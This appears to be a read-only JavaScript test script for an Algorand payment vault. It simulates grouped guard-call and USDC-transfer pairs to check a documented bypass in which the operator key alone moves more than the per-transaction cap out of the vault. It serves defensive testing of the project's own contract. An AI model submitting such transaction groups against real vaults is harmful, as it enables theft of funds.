// READ-ONLY: does the operator key alone move money out of the vault under v1?
// KNOWN_BYPASSES.md #6 says yes (N pairs of guard+payment, each within cap).
import "dotenv/config";
import algosdk from "algosdk";
import { algod, account, USDC_ASA_ID, MIN_FEE } from "../src/common.mjs";
const GUARD = Number(process.env.POLICY_APP_ID), CAP = Number(process.env.CAP_MICRO);
const agent = account("AGENT"), operator = account("OPERATOR");
const merchant = process.env.MERCHANT_ADDRESS;
const vault = new algosdk.LogicSigAccount(Buffer.from(process.env.VAULT_LSIG_B64, "base64"));
const idx = (n) => { const b = new Uint8Array(8); new DataView(b.buffer).setBigUint64(0, BigInt(n)); return b; };
const sp = await algod.getTransactionParams().do();

for (const pairs of [1, 7, 8]) {
  const n = pairs * 2;
  const txns = [];
  for (let i = 0; i < pairs; i++) {
    txns.push(algosdk.makeApplicationNoOpTxnFromObject({ sender: operator.addr, appIndex: GUARD,
      appArgs: [idx(2*i+1)], suggestedParams: { ...sp, fee: i===0 ? MIN_FEE*(n+1) : 0, flatFee: true } }));
    txns.push(algosdk.makeAssetTransferTxnWithSuggestedParamsFromObject({ sender: agent.addr, receiver: merchant,
      assetIndex: USDC_ASA_ID, amount: CAP, note: new TextEncoder().encode("u"+pairs+"-"+i+"-"+Date.now()), suggestedParams: { ...sp, fee: 0, flatFee: true } }));
  }
  algosdk.assignGroupID(txns);
  const stxns = txns.map((t,i) => i%2===0 ? t.signTxn(operator.sk) : algosdk.signLogicSigTransactionObject(t, vault).blob);
  const req = new algosdk.modelsv2.SimulateRequest({ txnGroups: [ new algosdk.modelsv2.SimulateRequestTransactionGroup({ txns: stxns.map(b => algosdk.decodeSignedTransaction(b)) }) ] });
  try {
    const r = await algod.simulateTransactions(req).do();
    const g = r.txnGroups[0];
    const s = g.failureMessage ? String(g.failureMessage).replace(/\s+/g," ") : "";
    const hit = s.match(/rejected by (ApprovalProgram|logic)[^,;]*/i);
    console.log(`${pairs} pair(s) / ${n} txns  moves ${pairs*CAP} microUSDC  ->  ${s ? "BLOCKED " + (hit?hit[0]:s.slice(0,120)) : "WOULD SETTLE"}`);
  } catch (e) { console.log(`${pairs} pair(s) / ${n} txns  ->  ERROR ${String(e.message??e).replace(/\s+/g," ").slice(0,140)}`); }
}
